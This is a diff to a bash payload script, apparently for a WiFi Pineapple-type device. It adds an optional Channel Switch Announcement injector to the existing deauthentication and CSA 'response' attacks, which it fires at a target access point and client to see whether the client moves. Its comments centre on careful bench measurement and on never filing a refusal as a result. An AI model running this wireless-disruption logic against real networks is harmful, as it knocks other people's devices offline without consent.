@@ -103,6 +103,25 @@ CLI_CAP_SECS=4          # listen this long for who is talking to the target BSS
 CLI_CAP_COUNT=800       # frame cap for that capture (bounds the parse; the window bounds the dwell)
 CLI_CAP_SNAP=128        # MUST clear radiotap it_len + 16 to reach addr2: -s 32 cannot (18+16=34)
 FIRE_ERR="/tmp/cs_fire_$$.err"   # the attack command's stderr: a refusal must not read as a measurement
+# The CSA injector. A CSA from THIS firmware cannot work, for two independent reasons, neither
+# reachable by any setting: pineapd hardcodes Channel Switch Count 0 (li s1,0 at 0x4bee6c, which
+# ieee80211_mgd_csa_present() discards before the auth/assoc refusal check) AND a New Channel
+# Number of 14 (li a3,14 at 0x473634 -- 2484 MHz, Japan-only, 11b-only, absent from the US table).
+# Both are literals with a single call site. dev/injector/pagerinj builds the element properly, so
+# pointing CSA_INJECTOR at it routes the CSA leg there instead of at the firmware command.
+# DEFAULT OFF, and read dev/injector/README.md before turning it on. pagerinj's own docs say to
+# STOP PINEAPD first, because it hops the interface and its CSA flood is itself a CSA-bearing clone
+# source. CamHound cannot stop pineapd -- Recon, the EXAMINE lock and every deauth command ARE
+# pineapd -- so the in-payload path is betting that the EXAMINE lock holds the channel well enough,
+# and that bet is UNMEASURED. The validated way to run pagerinj is standalone, with pineapd stopped;
+# dev/injector/run_17a.sh does that. Turn this on only once the bench says the two can coexist.
+# Not starred: cfg() accepts integers only, so a path cannot arrive via PAYLOAD_SET_CONFIG, and a
+# star with no SETTINGS_TABLE row is a lie (CLAUDE.md). Edit these here.
+CSA_INJECTOR=""         # absolute path to pagerinj; empty = use the firmware command
+CSA_COUNT=3             # Channel Switch Count to announce. pineapd sends 0; day-one 17a is 0 vs 3
+CSA_CHAN=0              # New Channel Number to announce; 0 = auto, a legal channel in the same band
+CSA_INJ_SECS=3          # seconds pagerinj transmits (its own --secs)
+CSA_INJ_WAIT=5          # seconds pagerinj waits for a clean beacon to clone (its own --wait)
 POSTURE_TTL=300         # * seconds a posture badge stays cached per BSSID
 RESP_LOCK_SECS=20       # * EXAMINE lock duration held across a response (must exceed fire + settle)
 RESP_SETTLE_SECS=6      # * wait after transmitting before re-reading the target to judge the effect
@@ -1914,9 +1933,66 @@ resp_aggregate() {
   printf 'INCONCLUSIVE'
 }
 
+# csa_newchan -> the New Channel Number to announce, or empty when no honest answer exists.
+# A CSA naming the channel the target is already on announces no move: with mode 0 the kernel
+# discards it before reading the count (mlme.c:8351), and pagerinj refuses it outright without
+# --allow-same-chan. So auto picks a DIFFERENT channel in the same band. Deliberately a LEGAL one:
+# the open question is whether a count >= 1 denies reconnection, and that needs the client to
+# actually attempt the move. An illegal channel would confound "refused to move" with "could not".
+csa_newchan() {
+  (( CSA_CHAN > 0 )) && { printf '%s' "$CSA_CHAN"; return 0; }
+  case "$R_BAND" in
+    2) (( R_CH >= 7 )) && printf '1'  || printf '11' ;;
+    5) (( R_CH == 36 )) && printf '40' || printf '36' ;;
+    6) (( R_CH == 37 )) && printf '41' || printf '37' ;;
+    *) printf '' ;;      # band unknown: refuse to guess, the caller falls back to the firmware
+  esac
+}
+
+# csa_issue -> 0 when a CSA was issued, non-zero when nothing was. Sets CSA_CMD (what the loot
+# should name) and CSA_ERR (the diagnostic), because the two senders disagree about which signal
+# means failure:
+#   hak5cmd  exits 0 on EVERY path including its errors and writes them to stderr, so STDERR is the
+#            only signal and rc is worthless (measured 2026-11-05).
+#   pagerinj returns `failed && !sent ? 1 : 0` and prints its sent=/failed= summary to stderr even
+#            on success, so RC is the signal and testing stderr would report failure every time.
+# Getting that backwards either way files a fabricated result, which is the whole thing this rung
+# exists to prevent.
+CSA_CMD=''; CSA_ERR=''
+csa_issue() {
+  local nc rc err fw
+  CSA_CMD=''; CSA_ERR=''
+  if [ -n "$CSA_INJECTOR" ] && [ -x "$CSA_INJECTOR" ]; then
+    nc=$(csa_newchan)
+    if [ -z "$nc" ]; then
+      log resp "csa injector skipped: no band for $R_BSSID, cannot pick a new channel"
+    else
+      : >"$FIRE_ERR"
+      "$CSA_INJECTOR" -i "$RECON_IF" --csa --bssid "$R_BSSID" --chan "$nc" \
+        --count "$CSA_COUNT" --secs "$CSA_INJ_SECS" --wait "$CSA_INJ_WAIT" \
+        >/dev/null 2>"$FIRE_ERR"
+      rc=$?; err=$(tr '\n' ' ' <"$FIRE_ERR" 2>/dev/null); rm -f "$FIRE_ERR"
+      CSA_CMD="${CSA_INJECTOR##*/}:ch$nc:n$CSA_COUNT"   # expansion, not basename: one less command to exist
+      log resp "csa inject $CSA_CMD rc=$rc${err:+ out=${err:0:200}}"
+      (( rc == 0 )) && return 0
+      CSA_ERR="injector rc $rc: ${err:0:160}"
+      return "$rc"
+    fi
+  fi
+  fw=$(response_cmd CSA)
+  CSA_CMD="$fw"
+  [ -n "$fw" ] && command -v "$fw" >/dev/null 2>&1 || { CSA_ERR="$fw not present"; return 1; }
+  : >"$FIRE_ERR"
+  "$fw" "$R_BSSID" "$R_CH" >/dev/null 2>"$FIRE_ERR"; rc=$?
+  err=$(tr '\n' ' ' <"$FIRE_ERR" 2>/dev/null); rm -f "$FIRE_ERR"
+  log resp "cmd $fw rc=$rc${err:+ err=${err:0:120}}"
+  (( rc == 0 )) && [ -z "$err" ] && return 0
+  CSA_ERR="${err:0:160}"; return 1
+}
+
 resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was reached
   local mac="$1" k="$2" badge="$3" cmd lock rc m p0 t0 p1 t1 present verdict nmv=0 nne=0 ninc=0 n
-  local scope tgt_verdict=- cap_secs lock_secs t_cap why frc ferr nmeas=0
+  local scope tgt_verdict=- cap_secs lock_secs csa_secs=0 t_cap why frc ferr nmeas=0
   local -a subjects=(); local -A P0=() T0=()
   RESP_MEMBERS=(); RESP_MEMBERS_BSS=''      # never inherit a previous target's set
   cmd=$(response_cmd "$k")
@@ -1931,7 +2007,13 @@ resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was r
   # asymmetry that was quietly biasing the oracle: the pre-read used to run unlocked while the
   # post-read ran locked, and an unlocked read sees a hopping radio's thinner counters.
   cap_secs=0; [ "$scope" = bss ] && cap_secs=$(( CLI_CAP_SECS + 2 ))
-  lock_secs=$(( RESP_LOCK_SECS + cap_secs ))   # additive: resp_clamp_lock's floor is not ours to move
+  # The injector waits for a beacon to clone and then transmits for a while, all of it INSIDE the
+  # locked episode, so its budget has to be in the lock or the lock expires mid-fire and the
+  # post-read lands on a hopping radio -- the exact false green resp_verdict exists to prevent.
+  if [ -n "$CSA_INJECTOR" ] && [ -x "$CSA_INJECTOR" ] && { [ "$k" = CSA ] || [ "$k" = BOTH ]; }; then
+    csa_secs=$(( CSA_INJ_SECS + CSA_INJ_WAIT + 2 ))
+  fi
+  lock_secs=$(( RESP_LOCK_SECS + cap_secs + csa_secs ))   # additive: resp_clamp_lock's floor is not ours to move
   lock_target "$R_BSSID" "$lock_secs" "$R_CH"; rc=$?
   case $rc in 0) lock=ok ;; 1) lock=by-channel ;; 3) lock=unverified ;; *) lock=failed ;; esac
   if (( rc == 2 )); then
@@ -1962,7 +2044,7 @@ resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was r
     # the device for a full CLI_CAP_COUNT buffer (RESPONSE.md 13a-i), so any fixed number either
     # over-locks every quiet BSS or under-locks a busy one. Re-arming costs lock_target's channel
     # read-back and is exact. Measured on the air, the dwell line above is what tells us which.
-    lock_target "$R_BSSID" "$RESP_LOCK_SECS" "$R_CH"; rc=$?
+    lock_target "$R_BSSID" $(( RESP_LOCK_SECS + csa_secs )) "$R_CH"; rc=$?
     case $rc in 0) lock=ok ;; 1) lock=by-channel ;; 3) lock=unverified ;; *) lock=failed ;; esac
     if (( rc == 2 )); then
       unlock_target
@@ -2025,11 +2107,17 @@ resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was r
   # 17a). A swallowed refusal does not merely lose information, it files a fabricated answer.
   # CMD_REFUSED is deliberately NOT in the MOVED/NO_EFFECT/INCONCLUSIVE vocabulary, so a refusal
   # can never be mistaken for a measurement by a reader of responses.tsv.
-  : >"$FIRE_ERR"
-  if [ "$k" = CSA ]; then "$cmd" "$R_BSSID" "$R_CH" >/dev/null 2>"$FIRE_ERR"
-  else "$cmd" "$R_BSSID" "$R_TARGET" "$R_CH" >/dev/null 2>"$FIRE_ERR"; fi
-  frc=$?; ferr=$(tr '\n' ' ' <"$FIRE_ERR" 2>/dev/null); ferr=${ferr:0:200}; rm -f "$FIRE_ERR"
-  log resp "cmd $cmd rc=$frc${ferr:+ err=$ferr}"
+  if [ "$k" = CSA ]; then
+    # csa_issue owns the rc-vs-stderr question, which the two senders answer oppositely, and logs
+    # its own command line. It also names itself for the loot, so a reader can tell a pagerinj CSA
+    # from a firmware one without cross-referencing the config.
+    csa_issue; frc=$?; ferr="$CSA_ERR"; cmd="$CSA_CMD"
+  else
+    : >"$FIRE_ERR"
+    "$cmd" "$R_BSSID" "$R_TARGET" "$R_CH" >/dev/null 2>"$FIRE_ERR"
+    frc=$?; ferr=$(tr '\n' ' ' <"$FIRE_ERR" 2>/dev/null); ferr=${ferr:0:200}; rm -f "$FIRE_ERR"
+    log resp "cmd $cmd rc=$frc${ferr:+ err=$ferr}"
+  fi
   if (( frc != 0 )) || [ -n "$ferr" ]; then
     unlock_target; log resp "unlocked after refusal"
     LOG red "$cmd refused (rc $frc): nothing was transmitted"${ferr:+$'\n'"$ferr"}
@@ -2041,17 +2129,13 @@ resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was r
   # 401 is dead code no command reaches). A refused CSA leg must NOT fail the attempt -- the deauth
   # has already left -- so it warns and the loot records which legs went out.
   if [ "$k" = BOTH ]; then
-    local csa_cmd csa_rc csa_err
-    csa_cmd=$(response_cmd CSA)
-    if [ -n "$csa_cmd" ] && command -v "$csa_cmd" >/dev/null 2>&1; then
-      : >"$FIRE_ERR"
-      "$csa_cmd" "$R_BSSID" "$R_CH" >/dev/null 2>"$FIRE_ERR"; csa_rc=$?
-      csa_err=$(tr '\n' ' ' <"$FIRE_ERR" 2>/dev/null); rm -f "$FIRE_ERR"
-      log resp "cmd $csa_cmd rc=$csa_rc${csa_err:+ err=${csa_err:0:120}}"
-      if (( csa_rc == 0 )) && [ -z "$csa_err" ]; then cmd="$cmd+CSA"
-      else LOG yellow "CSA leg refused; the deauth was still sent"; fi
+    if csa_issue; then
+      # Keep the firmware spelling stable for readers and for the gates; name the injector when it
+      # is what actually sent, since "which CSA was this" is the first question a loot row raises.
+      case "$CSA_CMD" in PINEAPPLE_*) cmd="$cmd+CSA" ;; *) cmd="$cmd+$CSA_CMD" ;; esac
     else
-      log resp "csa leg skipped: $csa_cmd not present"
+      LOG yellow "CSA leg did not send; the deauth was still transmitted"
+      log resp "csa leg failed ${CSA_ERR:-unknown}"
     fi
   fi
   # Targeted sweep. Measured on the bench 2026-11-05 against one phone on one AP: a TARGETED
